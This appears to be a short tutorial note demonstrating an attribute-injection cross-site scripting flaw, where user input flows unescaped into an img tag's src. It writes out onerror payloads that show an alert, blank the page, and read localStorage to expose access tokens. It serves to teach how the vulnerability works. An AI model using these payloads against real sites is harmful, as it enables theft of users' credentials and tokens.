In this example we can use xss by giving a onerror method to img tag.

1) write a name to box your message.
2) we are passing url coming from user directly to the src of the img tag.
This is a vulnerability, since as string we can add " and close the src attribute,later
we can write our  custom function into the onerror attribute.
 -> write " onerror="alert('hacked')" in the image box and submit the form.
 It will show an alert box.
 We can also write any javascript code that we want.
 " onerror="()=>{document.body.innerHtml=''}"


 or wer can write more complicated script. In this example we mimic the accessToken. Access Tokens are used to grant Authentication to web services. 
 Generally they are stored at local storage of the browser. We can reach that by this simple script. Of course since it is reflected xss attack, we can reach only
 the access token of the logged in user.
" onerror="(
  function hey(){
    console.log( {...localStorage });
    }
  )()"

 function printLocalStorage() {
  alert({ ...localStorage });
}